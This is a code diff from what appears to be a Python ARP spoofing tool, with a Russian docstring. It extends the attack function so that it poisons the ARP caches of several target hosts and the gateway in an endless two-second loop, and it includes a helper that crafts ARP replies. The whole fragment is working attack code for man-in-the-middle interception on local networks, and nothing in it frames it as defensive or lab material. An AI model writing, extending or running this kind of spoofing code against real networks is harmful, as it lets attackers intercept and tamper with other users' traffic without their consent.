@@ -17,10 +17,16 @@ def restore_arp(target_ip, spoof_ip):
         arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
         send(arp_response, count=4, verbose=False)
 
-def arp_spoof_attack(target_ip, gateway_ip ):
-    #target_ip, gateway_ip = input("# Target ip >"), input("# Spoof ip > ")
-    print(f"[*] Starting ARP spoofing attack on {target_ip} (target) and {gateway_ip} (gateway)")
+def arp_spoof_attack(target_ips, gateway_ip):
+    """
+    target_ips: str или list[str] — IP-адрес(а) цели
+    gateway_ip: str — IP-адрес шлюза
+    """
+    if isinstance(target_ips, str):
+        target_ips = [target_ips]
+    print(f"[*] Starting ARP spoofing attack on targets: {target_ips} and gateway: {gateway_ip}")
     while True:
-        arp_spoof(target_ip, gateway_ip)
-        arp_spoof(gateway_ip, target_ip)
+        for target_ip in target_ips:
+            arp_spoof(target_ip, gateway_ip)
+            arp_spoof(gateway_ip, target_ip)
         time.sleep(2)
